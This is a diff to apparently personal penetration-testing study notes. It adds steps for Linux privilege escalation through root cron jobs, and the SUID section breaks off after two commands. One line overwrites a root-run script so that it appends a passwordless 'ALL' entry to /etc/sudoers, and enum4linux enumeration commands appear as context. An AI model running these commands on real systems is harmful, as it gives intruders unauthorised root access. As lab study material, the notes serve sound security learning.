@@ -322,4 +322,21 @@ DO MIMIKATZ FIRST!
 **Enum4linux**
 1. `enum4linux -a 10.10.x.x`
 2. using after bruteforce: `enum4linux -a -u username -p password 10.10.x.x`
-   
+
+### Exploiting CRON jobs
+- task sheduling. a application or script that is configured to run repeatedly with Cron is known as a cron job
+- Cron job that have been created by the root user will have root priveleges
+- find and identify cronjobs
+  !!After logging in and having credentials!!
+1. to see file privileges `ls -al`, to see list of sheduled cron jobs `crontab -l`
+2.  look for occurences of the root privileged files : `grep -rnw /usr -e "/home/student/message"`
+3.  `ls -al /usr/local/share/copy.sh`
+4.  `printf '#!/bin/bash\necho "youraccount ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh`
+### Exploiting SUID Binaries PRiv esc technique
+- depends on the owner of the SUID binary: needs root privileges
+!!THIS DEMO IS ALREADY GOT IN TO THE SYSTEM, THIS IS PRIVESC PART!!
+"student demo"
+R=READ - W=WRITE - S=SUID - X=EXECUTE - 
+1. `groups youraccount`
+2. lists files detailly with hidden files: `ls -al`
+3. ...
